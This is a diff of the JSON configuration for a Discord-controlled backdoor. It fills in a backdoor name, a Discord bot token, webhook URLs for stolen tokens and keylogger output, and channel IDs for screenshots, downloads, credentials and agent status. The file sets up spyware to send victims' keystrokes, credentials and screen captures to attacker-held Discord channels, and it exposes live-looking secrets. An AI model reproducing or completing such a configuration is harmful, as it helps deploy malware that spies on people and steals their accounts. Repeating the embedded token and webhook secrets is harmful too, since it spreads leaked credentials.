@@ -1,13 +1,13 @@
 {
     "settings":{
-        "backdoor-name": "None",
-        "bot-token": "None",
-        "token-webhook": "None",
-        "keylogger-webhook": "None",
-        "screenshots-id": "None",
-        "downloads-id": "None",
-        "agent-online-id": "None",
-        "credentials-id": "None",
-        "auto-keylogger": "None"
+        "backdoor-name": "BACKDOOR",
+        "bot-token": "OTQ2NTg0MzU1NjY3NTc4OTUx.Yhg1YQ.aKoqy89KeNBBEu3PrvCjx968XoY",
+        "token-webhook": "https://discord.com/api/webhooks/947874378232786955/v9EToZi5sX5dXrMux0FzWgFl2ms6xo-kvSBxqBVpiTwDaMTZD75thBkChUkABpLwEnMc",
+        "keylogger-webhook": "https://discord.com/api/webhooks/947874490778533919/swDOgD4zgtsAenPbPsUGKxvDUwsbL_XQZx7lq2D31cSEl3xQnTl1UgMwoBeT-P0vOb78",
+        "screenshots-id": "947873577061974082",
+        "downloads-id": "947873577061974084",
+        "agent-online-id": "947873577061974078",
+        "credentials-id": "947873577061974083",
+        "auto-keylogger": "False"
     }
 }
